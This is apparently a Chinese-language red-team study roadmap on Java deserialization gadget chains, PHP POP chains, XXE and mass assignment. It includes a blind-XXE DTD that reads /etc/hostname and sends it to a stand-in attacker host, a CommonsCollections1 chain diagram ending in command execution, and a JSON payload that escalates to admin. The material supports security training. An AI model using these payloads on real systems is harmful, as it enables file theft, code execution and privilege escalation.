# 🧬 物件反序列化 Gadget 鏈與 XXE 實體解析深度學習路徑 (Deserialization & XXE)
> 對應紅隊作戰矩陣：**Phase 2 (R12)** (R12.1 ~ R12.3)  
> 預計總投入時間：**30 ~ 35 小時**（視 Java 反射機制、PHP 物件魔術方法與 XML DTD 解析基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
反序列化只會拿現成工具無腦打 ──►     精通 Java ysoserial Gadget 呼叫鏈構造與動態代理
看到 XML 只會簡單讀本機檔    ──►     精通盲注 XXE、參數實體 (PE) 與 OOB 資料外帶
只知參數傳遞不知對象綁定     ──►     精通 Mass Assignment 濫用直接提升管理員特權
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| Java 序列化與 ObjectInputStream | 熟悉 `Serializable` 介面、`readObject()` 魔術方法與反射機制 | [Oracle: Java Object Serialization](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html) |
| XML DTD (文件類型定義) 規範 | 理解內部實體、外部實體 (SYSTEM) 與參數實體 (`%pe;`) 語法 | [W3C: XML DTD Specification](https://www.w3.org/TR/xml/) |
| Web MVC 框架模型綁定 | 熟悉 Spring MVC `@ModelAttribute` 與 Rails 參數強綁定機制 | [OWASP: Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
反序列化機制   Java Gadget鏈  PHP魔術方法    XXE實體與OOB   Mass Assignment
(6h)           (10h)          (6h)           (8h)           (4h)
```

---

## ☕ 階段一：Java 不安全反序列化與底層機制（約 6 小時）

### 1.1 序列化資料流特徵
Java 序列化二進位位元組流開頭具有標誌性 Magic Header：
- 十六進制：`AC ED 00 05`
- Base64 編碼開頭：`rO0AB...`
當應用程式調用 `ObjectInputStream.readObject()` 反序列化不可信輸入時，會觸發自定義類別內部實現的生命週期鉤子。

---

## 🔗 階段二：Java ysoserial 核心 Gadget 鏈分析 (CommonsCollections)（約 10 小時）

### 2.1 CommonsCollections 1 (CC1) 呼叫鏈剖析
```
[外部輸入二進位流]
       │
       ▼ readObject()
[AnnotationInvocationHandler] ── (觸發 Map.get())
       │
       ▼ get()
[LazyMap] ── (若鍵不存在，調用 Transformer.transform())
       │
       ▼ transform()
[ChainedTransformer] ── (依序鏈式調用反射)
       │
       ├── ConstantTransformer (返回 Runtime.class)
       ├── InvokerTransformer (調用 getMethod("getRuntime"))
       ├── InvokerTransformer (調用 invoke())
       └── InvokerTransformer (調用 exec("calc.exe / bash -c ..."))
                                         │
                                         ▼ [達成任意代碼執行 RCE！]
```

---

## 🐘 階段三：PHP 物件魔術方法與 POP 鏈構造（約 6 小時）

### 3.1 核心魔術方法觸發時機
- `__destruct()`：物件被銷毀或腳本結束時自動調用（最常見的 POP 鏈起點）。
- `__toString()`：物件被當作字串處理（如 `echo`, `strlen`, 字串拼接）時觸發。
- `__call()`：調用不存在的方法時觸發。

---

## 📄 階段四：XML 外部實體 (XXE) 解析機制與 OOB 資料外帶（約 8 小時）

### 4.1 盲注 XXE (Blind XXE) 帶外外帶敏感檔案
當目標完全不回顯 XML 解析結果時，利用外部 DTD 構造回連請求，將檔案內容編碼後作為 URL 參數外帶至攻擊者伺服器：
```xml
<!-- 攻擊者惡意 DTD 伺服器 (eval.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-oob.com/?data=%file;'>">
%eval;
%exfiltrate;
```

---

## 🏷️ 階段五：物件自動綁定濫用 (Mass Assignment)（約 4 小時）

### 5.1 現代 RESTful API 參數溢出
現代 Web 框架（Spring Boot, Node.js Sequelize, Ruby on Rails）會自動將 JSON 鍵值對綁定至後端 POJO/Model。若開發者未設定屬性白名單，攻擊者可在註冊或個人資料更新請求中夾帶高特權欄位：
```json
{
  "username": "attacker",
  "email": "attacker@corp.com",
  "is_admin": true,
  "role": "SuperAdministrator"
}
```

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能識別 Java 序列化數據流特徵 (`rO0AB` / `aced0005`)。
- [ ] 深入理解 CommonsCollections 反射鏈的觸發時序與類別轉化過程。
- [ ] 能根據 PHP 原始碼手動串接包含 `__destruct` 與 `__toString` 的 POP 利用鏈。
- [ ] 掌握利用外部 DTD 實施 Blind XXE 敏感檔案讀取的完整流程。
- [ ] 能在 API 測試中發現並利用 Mass Assignment 漏洞覆寫後端受保護欄位。
